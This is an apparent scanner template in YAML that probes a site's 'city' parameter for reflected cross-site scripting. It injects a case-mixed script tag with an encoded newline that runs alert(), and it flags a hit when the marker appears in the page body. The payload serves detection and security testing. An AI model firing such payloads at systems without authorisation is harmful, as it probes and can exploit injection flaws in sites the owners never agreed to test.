id: xss5-1021
name: 'Raw XSS5 in city'
severity: high
type: active
tags:
  - xss
  - injection
  - client
description: 'Unencoded reflection in city'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      city:
        - '<ScRiPt%0a>alert(nx51020)</ScRiPt>'
    matchers:
      - type: word
        part: body
        words:
          - 'nx51020'
